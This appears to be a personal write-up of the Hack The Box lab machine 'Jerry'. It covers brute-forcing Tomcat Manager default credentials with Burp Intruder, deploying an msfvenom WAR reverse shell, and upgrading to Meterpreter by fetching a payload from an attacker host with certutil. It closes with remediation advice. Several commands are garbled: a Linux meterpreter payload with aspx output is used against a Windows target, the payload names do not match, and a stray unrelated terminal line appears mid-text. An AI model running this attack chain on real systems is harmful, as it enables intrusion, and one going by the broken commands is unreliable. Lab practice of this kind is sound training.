Machine name: Jerry
Platform: Hackthebox
difficulty: Easy
target IP: 10.10.10.95 

### Enumeration:

**nmap scan:**
![[Pasted image 20260726221034.png|519]]

| Port | State | Service | Version                             |
| ---- | ----- | ------- | ----------------------------------- |
| 8080 | open  | http    | Apache Tomcat/coyote JSP engine 1.1 |
 **Website analysis:** ![[Pasted image 20260726230345.png]]
- as it is running the apache tomcat, and has a login page so we will try to gain access but credential stuffing.

**Credential discovery:**
![[Pasted image 20260727195028.png|513]]
This is page contains tomcat default credential .
- save these credentials into the a tomcat.txt file.

### Exploitation:
**Burp-suit:** use burp-suit to credential stuffing in the website.

- open the burp-suit and go to the proxy and then turn on the interceptor.
![[Pasted image 20260727214449.png]]

- Click the **Manager App** button on the Tomcat homepage.
![[Pasted image 20260727215619.png|225]]
by this a request will go to the intercepter and then forward it and a username password interface will pop-up in the website.

- enter the any credentials into it and click ok , this will give a request to the proxy.
![[Pasted image 20260727215915.png|447]]

- now we have to change the format of the tomcat.txt file into the same as the format of blue box and then change them into base64 format like in red box given in the image below.
![[Pasted image 20260727222238.png|339]]

![[Pasted image 20260728150500.png]]
fig: changed tomcat.txt.

- how to change the normal credential into base64.
![[Pasted image 20260728151549.png|400]]
```
echo -n 'tomcat:tomcat' | base64
```
HTTP Basic Authentication sends credentials in Base64 format. Therefore, each username and password pair must be encoded before being used as a Burp Intruder payload.

- Change all the credential in the tomcat.txt file into base64.
to do this make a bash script.
![[Pasted image 20260728154643.png|599]]
```
for cred in $(cat tomcat.txt); do echo -n $cred | base64; done
```

- open the intruder in the burp-suit and Add$ the payload parameter  and keep the attack type to sniper.
![[Pasted image 20260728155402.png|585]]
- go to the payload section and paste the all base64 payloads we generated.
![[Pasted image 20260728155318.png|336]]
- disable the url incoding , as i will try to connect each payload to the there urls.
![[Pasted image 20260728155518.png|499]]
- After the Intruder attack completes, compare the response lengths. One request has a significantly larger response, indicating a successful login.
![[Pasted image 20260728160120.png|400]]
The target is running Apache Tomcat and exposes the Tomcat Manager login page. Since Tomcat installations are often configured with default credentials, credential testing was performed using a list of known default usernames and passwords.

![[Pasted image 20260728165457.png]]

**Successful Authentication:**
![[Pasted image 20260728160522.png|509]]

- there section to upload **WAR file** into the website.
![[Pasted image 20260728165834.png]]
generate a **malicious WAR file** to upload here.

**Generate the WAR Payload:**
Generate a Java WAR reverse shell that can be uploaded through the Tomcat Manager application.(https://github.com/frizb/MSF-Venom-Cheatsheet)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
```
enter your IP and port (let port be 4444.)

- open a listener port using `netcat` , on the selected port in payload.
```
nc -nvpl 4444
``` 
![[Pasted image 20260728173542.png]]

**Deploying the WAR file:**
- go to the website , upload the shell.war file into the website and open/run it.
![[Pasted image 20260728173747.png]]

**Obtaining Reverse Shell:**
- check the `netcat` listener on the terminal.
![[Pasted image 20260728174113.png]]
### Post Exploitation:
**Upgrading to Meterpreter:**
To transfer files into the window machine so improve the shell and get more flexibility into the connection.
 you can change the payload to meterpreter for more flexible accessibility, [[Report on Devel (allows anonymous ftp login)]]
 
**Generate the payload:**
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx > ex.aspx
```


**Set the Multi-handler:**
set the multi-handler in the msfconsole,
```
set payload window/meterpreter/reverse_tcp
```
- set the LHOST AND LPORT as same as the payload.
- set ExitOnSession `false`.
```
set ExitOnSession false
```

Now host a web-server to access the files in your window:
```
python -m http.server 80
```
![[Pasted image 20260728182235.png]]
![[Pasted image 20260728182422.png]]
└─$ geany overthewire.txt&
[1] 98704

Since Windows includes the `certutil` utility by default, it is used to download the payload directly from the attacker's web server.
```
certutil -urlcache -f http://10.10.14.24/sh.exe c:\users\administrator\desktop\flags\sh.exe
```
![[Pasted image 20260728193426.png]]
after downloading `sh.exe`.
- run the `sh.exe` file.
Because it is a reverse Meterpreter payload, it immediately tries to connect back to `10.10.14.24:4444` , where the Metasploit multi/handler is listening.
	so once the `sh.exe` executes , by the reverse tcp the metasploit will make a reverse connection , resulting in a fully interactive Meterpreter session.
![[Pasted image 20260728193731.png]]
Advantages of upgrading to Meterpreter include:

- Stable encrypted communication
- File upload and download
- Process migration
- Privilege management
- Screenshot and webcam support (when applicable)
- Easy shell management
- Better post-exploitation capabilities

**Summary:**
Enumeration identified Apache Tomcat 7.0.88 running on port 8080. By testing default Tomcat credentials, administrative access to the Tomcat Manager was obtained. A malicious WAR payload was deployed, resulting in remote code execution. The initial shell was upgraded to a Meterpreter session for improved post-exploitation capabilities. The assessment concluded with full SYSTEM-level access and successful retrieval of the target flags.

# Attack Path Summary

1. Enumerated the target using Nmap.
2. Identified Apache Tomcat Manager running on port 8080.
3. Gathered common Tomcat default credentials.
4. Used Burp Suite Intruder to test the credentials.
5. Successfully authenticated to the Tomcat Manager.
6. Generated a malicious WAR reverse shell payload.
7. Uploaded and deployed the WAR file.
8. Triggered the reverse shell.
9. Generated a Meterpreter executable for a more reliable session.
10. Hosted the executable using a Python HTTP server.
11. Downloaded the payload with `certutil`.
12. Executed the payload.
13. Received a Meterpreter session.
14. Retrieved the flags.

**Attack chain workflow:**
![[Pasted image 20260728193254.png|425]]
# Key Learning Points

- Enumeration often reveals default services that expose administrative interfaces.
- Default credentials remain one of the most common causes of server compromise.
- Burp Suite Intruder can automate authentication testing.
- Apache Tomcat Manager allows authenticated users to deploy WAR applications.
- A WAR file can be used to gain code execution on a Tomcat server.
- Windows `certutil` can be abused as a Living-off-the-Land Binary (LOLBin) to transfer files.
- Upgrading from a basic reverse shell to Meterpreter significantly improves post-exploitation capabilities.
- Matching the payload configuration between `msfvenom` and the Metasploit handler is essential for a successful reverse connection.
# Remediation

To prevent this attack:

- Remove or disable default Tomcat credentials.
- Use strong, unique administrator passwords.
- Restrict access to the Tomcat Manager interface using IP allowlists or VPN access.
- Remove unnecessary management applications from production systems.
- Keep Apache Tomcat updated with the latest security patches.
- Monitor and restrict the execution of LOLBins such as `certutil.exe`.
- Deploy Endpoint Detection and Response (EDR) solutions capable of detecting malicious payload execution.
- Limit outbound connections from servers where possible.
- Monitor unusual WAR deployments and administrator logins.
# Conclusion

The Jerry machine demonstrates how a seemingly small misconfiguration—leaving default Tomcat credentials enabled—can result in complete system compromise. By authenticating to the Tomcat Manager, deploying a malicious WAR file, and upgrading the initial shell to a Meterpreter session, full administrative control of the Windows server was obtained. This exercise highlights the importance of secure default configurations, strong authentication, proper access controls, and post-exploitation awareness in real-world penetration testing.